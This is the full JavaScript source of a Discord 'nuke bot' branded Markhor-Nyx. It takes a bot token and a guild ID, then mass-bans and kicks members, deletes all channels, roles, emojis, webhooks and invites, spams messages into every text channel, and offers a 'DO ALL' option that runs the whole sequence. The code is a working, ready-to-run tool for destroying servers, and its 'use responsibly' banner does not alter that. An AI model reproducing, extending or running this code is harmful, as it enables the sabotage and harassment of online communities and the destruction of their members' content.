const Discord = require("discord.js");
const prompt = require("prompt-sync")({ sigint: true });
const chalk = require("chalk");
const { sleep } = require("visa2discord"); // Assuming this provides a Promise-based sleep

function displayBanner() {
    console.log(chalk.magenta("----------------------------------------------------"));
    console.log(chalk.cyanBright("            Markhor-Nyx Discord Nuke Bot        "));
    console.log(chalk.magenta("----------------------------------------------------"));
    console.log(chalk.blue("Developed by: Markhor-Nyx"));
    console.log(chalk.blue("Copyright (C) Markhor-Nyx. All rights reserved."));
    console.log(chalk.red.bold("\nWARNING: THIS TOOL IS HIGHLY DESTRUCTIVE. USE RESPONSIBLY AND ETHICALLY.\n"));
}

displayBanner();

console.log(chalk.yellow("Please enter the bot token:"));
const token = prompt(chalk.cyan("> "));

const client = new Discord.Client({
  intents: [
    Discord.GatewayIntentBits.Guilds,
    Discord.GatewayIntentBits.GuildMembers,
    Discord.GatewayIntentBits.GuildIntegrations,
    Discord.GatewayIntentBits.GuildVoiceStates,
    Discord.GatewayIntentBits.MessageContent,
    Discord.GatewayIntentBits.GuildMessages,
    // Add any other intents your specific actions might need, e.g., GuildModeration for bans
  ],
});

process.on("unhandledRejection", (error) => {
  console.log(chalk.red("An unhandled error occurred:"));
  if (error.message === "Used disallowed intents") {
    console.log(
      chalk.red(
        "The bot needs privileged intents enabled in the Discord Developer Portal:\n- MESSAGE CONTENT INTENT\n- SERVER MEMBERS INTENT"
      )
    );
  } else if (error.code === Discord.RESTJSONErrorCodes.MissingPermissions) {
    console.log(chalk.red("Error: Bot lacks necessary permissions for an action. Ensure it has Administrator rights."));
  }
  else {
    console.log(chalk.red(error.message));
    // console.error(error); // For more detailed stack trace
  }
  // process.exit(1); // Commented out to allow bot to potentially recover or user to retry
});

client.login(token).catch((err) => {
  console.log(chalk.red("An error occurred while logging in:"));
  if (err.message.includes("Invalid token")) {
      console.log(chalk.red("The provided bot token is invalid. Please check it."));
  } else {
      console.log(chalk.red(err.message));
  }
  process.exit(1);
});

client.on("ready", () => {
  console.log(
    chalk.green(
      `\nMarkhor-Nyx Nuke Bot is online as ${client.user.tag}. Use responsibly.`
    )
  );
  mainMenuLoop();
});

async function confirmAction(actionName) {
    console.log(chalk.red.bold(`\nARE YOU ABSOLUTELY SURE you want to ${actionName}? This is irreversible.`));
    const confirmation = prompt(chalk.yellow("Type 'YES' to confirm, anything else to cancel: ")).toUpperCase();
    return confirmation === 'YES';
}

async function mainMenuLoop() {
    while (true) {
        console.log(
            chalk.yellow(
            "\nWhat do you want to do? \n1. Ban all members \n2. Kick all members \n3. Delete all channels \n4. Delete all roles \n5. Delete all emojis \n6. Delete all webhooks \n7. Delete all invites \n8. Spam A message \n9. DO ALL (EXTREMELY DANGEROUS) \n10. Exit"
            )
        );
        const choice = prompt(chalk.cyan("> "));
        if (choice === '10') {
            console.log(chalk.blue("Exiting Nuke Bot."));
            client.destroy(); // Gracefully disconnect the bot
            process.exit(0); // Normal exit
        }

        if (!['1', '2', '3', '4', '5', '6', '7', '8', '9'].includes(choice)) {
            console.log(chalk.red("Invalid option. Please try again."));
            continue;
        }

        const guildId = prompt(chalk.yellow("Please enter the guild ID: "));
        const guild = await client.guilds.fetch(guildId).catch((err) => {
            console.log(chalk.red("Invalid guild ID or bot is not in this guild."));
            return null; // So guild variable is null
        });

        if (!guild) {
            continue; // Go back to menu
        }
        
        console.log(chalk.magenta(`Selected Guild: ${guild.name} (${guild.id})`));
        console.log(chalk.magenta(`Member Count: ${guild.memberCount}`));


        const delayInput = prompt(
            chalk.yellow("Please enter the delay (in milliseconds, e.g., 1000 for 1 second): ")
        );
        const delay = parseInt(delayInput);
        if (isNaN(delay) || delay < 0) {
            console.log(chalk.red("Delay should be a non-negative number."));
            continue;
        }

        console.log(chalk.yellow(`Using a delay of ${delay}ms between actions.`));

        switch (choice) {
            case "1":
                if (await confirmAction("BAN ALL MEMBERS")) await banAll(guild, delay);
                break;
            case "2":
                if (await confirmAction("KICK ALL MEMBERS")) await kickAll(guild, delay); // Corrected call
                break;
            case "3":
                if (await confirmAction("DELETE ALL CHANNELS")) await deleteAllChannels(guild, delay);
                break;
            case "4":
                if (await confirmAction("DELETE ALL ROLES")) await deleteAllRoles(guild, delay);
                break;
            case "5":
                if (await confirmAction("DELETE ALL EMOJIS")) await deleteAllEmojis(guild, delay);
                break;
            case "6":
                // Webhooks might need GuildIntegrations intent and Manage Webhooks permission
                if (await confirmAction("DELETE ALL WEBHOOKS")) await deleteAllWebhooks(guild, delay);
                break;
            case "7":
                // Invites might need GuildIntegrations intent and Manage Server permission
                if (await confirmAction("DELETE ALL INVITES")) await deleteAllInvites(guild, delay);
                break;
            case "8":
                const message = prompt(
                    chalk.yellow("Please enter the message to spam: ")
                );
                if (await confirmAction(`SPAM THE MESSAGE "${message}"`)) await spamMessage(guild, delay, message);
                break;
            case "9":
                if (await confirmAction("NUKE THE ENTIRE SERVER (ALL ACTIONS)")) {
                    console.log(chalk.red.bold("\n--- STARTING FULL SERVER NUKE ---"));
                    // Consider fetching all members/channels etc. before starting for reliability
                    // For a "DO ALL", it might be better to run these sequentially or with some master control
                    // to avoid overwhelming the API, though nuke implies speed.
                    await banAll(guild, delay);
                    await kickAll(guild, delay); // Kicking after banning might not make sense if ban is permanent
                    await deleteAllChannels(guild, delay);
                    await deleteAllRoles(guild, delay);
                    await deleteAllEmojis(guild, delay);
                    await deleteAllWebhooks(guild, delay);
                    await deleteAllInvites(guild, delay);
                    console.log(chalk.red.bold("\n--- FULL SERVER NUKE ATTEMPTED ---"));
                }
                break;
        }
    }
}

async function banAll(guild, delay) {
  console.log(chalk.blue(`\nAttempting to ban all bannable members in ${guild.name}...`));
  let i = 0;
  // For very large guilds, fetching all members first is more reliable
  // await guild.members.fetch(); // This can be API intensive
  const membersToBan = Array.from(guild.members.cache.values()); // Get a snapshot
  const totalMembers = membersToBan.length;

  for (const member of membersToBan) {
    if (member.id === client.user.id) continue; // Don't ban self
    if (member.id === guild.ownerId) { // Don't ban owner
        console.log(chalk.yellow(`Skipping server owner: ${member.user.tag}`));
        continue;
    }
    if (member.bannable) {
      try {
        await sleep(delay);
        await member.ban({ reason: "Nuked by Markhor-Nyx Bot" });
        console.log(chalk.green(`Banned: ${member.user.tag}`));
        i++;
      } catch (error) {
        console.log(chalk.red(`Failed to ban ${member.user.tag}: ${error.message}`));
      }
    } else {
      console.log(chalk.yellow(`Cannot ban ${member.user.tag} (not bannable).`));
    }
  }
  console.log(chalk.greenBright(`\nBan process complete. Banned ${i} out of ${totalMembers} potential members.`));
}

async function kickAll(guild, delay) {
  console.log(chalk.blue(`\nAttempting to kick all kickable members in ${guild.name}...`));
  let i = 0;
  // await guild.members.fetch();
  const membersToKick = Array.from(guild.members.cache.values());
  const totalMembers = membersToKick.length;

  for (const member of membersToKick) {
    if (member.id === client.user.id) continue;
    if (member.id === guild.ownerId) {
        console.log(chalk.yellow(`Skipping server owner: ${member.user.tag}`));
        continue;
    }
    if (member.kickable) {
      try {
        await sleep(delay);
        await member.kick("Kicked by Markhor-Nyx Bot");
        console.log(chalk.green(`Kicked: ${member.user.tag}`));
        i++;
      } catch (error) {
        console.log(chalk.red(`Failed to kick ${member.user.tag}: ${error.message}`));
      }
    } else {
      console.log(chalk.yellow(`Cannot kick ${member.user.tag} (not kickable).`));
    }
  }
  console.log(chalk.greenBright(`\nKick process complete. Kicked ${i} out of ${totalMembers} potential members.`));
}

async function deleteAllChannels(guild, delay) {
  console.log(chalk.blue(`\nAttempting to delete all deletable channels in ${guild.name}...`));
  let i = 0;
  // await guild.channels.fetch();
  const channelsToDelete = Array.from(guild.channels.cache.values());
  const count = channelsToDelete.length;

  for (const channel of channelsToDelete) {
    try {
      await sleep(delay);
      await channel.delete("Nuked by Markhor-Nyx Bot");
      console.log(chalk.green(`Deleted channel: #${channel.name}`));
      i++;
    } catch (error) {
      console.log(chalk.red(`Failed to delete channel #${channel.name}: ${error.message}`));
    }
  }
  console.log(chalk.greenBright(`\nChannel deletion complete. Deleted ${i} out of ${count} channels.`));
}

async function deleteAllRoles(guild, delay) {
  console.log(chalk.blue(`\nAttempting to delete all deletable roles in ${guild.name}...`));
  let i = 0;
  // await guild.roles.fetch();
  const rolesToDelete = Array.from(guild.roles.cache.values());
  const count = rolesToDelete.length;

  for (const role of rolesToDelete) {
    if (role.managed || role.id === guild.id) { // Cannot delete @everyone or managed roles (e.g., bot roles)
        console.log(chalk.yellow(`Skipping role: ${role.name} (managed or @everyone)`));
        continue;
    }
    try {
      await sleep(delay);
      await role.delete("Nuked by Markhor-Nyx Bot");
      console.log(chalk.green(`Deleted role: ${role.name}`));
      i++;
    } catch (error) {
      console.log(chalk.red(`Failed to delete role ${role.name}: ${error.message}`));
    }
  }
  console.log(chalk.greenBright(`\nRole deletion complete. Deleted ${i} out of ${count} potential roles.`));
}

async function deleteAllEmojis(guild, delay) {
  console.log(chalk.blue(`\nAttempting to delete all emojis in ${guild.name}...`));
  let i = 0;
  // await guild.emojis.fetch();
  const emojisToDelete = Array.from(guild.emojis.cache.values());
  const count = emojisToDelete.length;

  for (const emoji of emojisToDelete) {
    try {
      await sleep(delay);
      await emoji.delete("Nuked by Markhor-Nyx Bot");
      console.log(chalk.green(`Deleted emoji: ${emoji.name}`));
      i++;
    } catch (error) {
      console.log(chalk.red(`Failed to delete emoji ${emoji.name}: ${error.message}`));
    }
  }
  console.log(chalk.greenBright(`\nEmoji deletion complete. Deleted ${i} out of ${count} emojis.`));
}

async function deleteAllWebhooks(guild, delay) {
    console.log(chalk.blue(`\nAttempting to delete all webhooks in ${guild.name}...`));
    let i = 0;
    try {
        const webhooks = await guild.fetchWebhooks(); // Fetches all webhooks
        const count = webhooks.size;
        for (const webhook of webhooks.values()) {
            try {
                await sleep(delay);
                await webhook.delete("Nuked by Markhor-Nyx Bot");
                console.log(chalk.green(`Deleted webhook: ${webhook.name}`));
                i++;
            } catch (error) {
                console.log(chalk.red(`Failed to delete webhook ${webhook.name}: ${error.message}`));
            }
        }
        console.log(chalk.greenBright(`\nWebhook deletion complete. Deleted ${i} out of ${count} webhooks.`));
    } catch (error) {
        console.log(chalk.red(`Could not fetch webhooks: ${error.message}. Ensure bot has 'Manage Webhooks' permission.`));
    }
}

async function deleteAllInvites(guild, delay) {
    console.log(chalk.blue(`\nAttempting to delete all invites in ${guild.name}...`));
    let i = 0;
    try {
        const invites = await guild.invites.fetch(); // Fetches all invites
        const count = invites.size;
        for (const invite of invites.values()) {
            try {
                await sleep(delay);
                await invite.delete("Nuked by Markhor-Nyx Bot");
                console.log(chalk.green(`Deleted invite code: ${invite.code}`));
                i++;
            } catch (error) {
                console.log(chalk.red(`Failed to delete invite ${invite.code}: ${error.message}`));
            }
        }
        console.log(chalk.greenBright(`\nInvite deletion complete. Deleted ${i} out of ${count} invites.`));
    } catch (error) {
        console.log(chalk.red(`Could not fetch invites: ${error.message}. Ensure bot has 'Manage Server' permission.`));
    }
}

async function spamMessage(guild, delay, message) {
  console.log(chalk.blue(`\nAttempting to spam message in all text channels of ${guild.name}...`));
  const timesInput = prompt(
    chalk.yellow("Please enter the number of times to spam per channel: ")
  );
  const times = parseInt(timesInput);
  if (isNaN(times) || times <= 0) {
    console.log(chalk.red("Number of times should be a positive number."));
    return;
  }

  let sentCount = 0;
  const textChannels = guild.channels.cache.filter(ch => ch.type === Discord.ChannelType.GuildText && ch.permissionsFor(client.user).has(Discord.PermissionFlagsBits.SendMessages));

  if (textChannels.size === 0) {
    console.log(chalk.yellow("No text channels found where the bot can send messages."));
    return;
  }

  console.log(chalk.blue(`Spamming "${message}" ${times} times in ${textChannels.size} channel(s).`));

  for (let i = 0; i < times; i++) {
    for (const channel of textChannels.values()) {
        try {
            await sleep(delay); // Delay before each message send
            await channel.send({ content: message });
            sentCount++;
            console.log(chalk.gray(`Sent to #${channel.name} (Spam iteration ${i+1})`));
        } catch (err) {
            console.error(chalk.red(`Failed to send to #${channel.name}: ${err.message}`));
            // Optionally remove channel from list if send fails repeatedly due to permissions
        }
    }
  }
  console.log(chalk.greenBright(`\nSpamming complete. Total messages sent: ${sentCount}.`));
}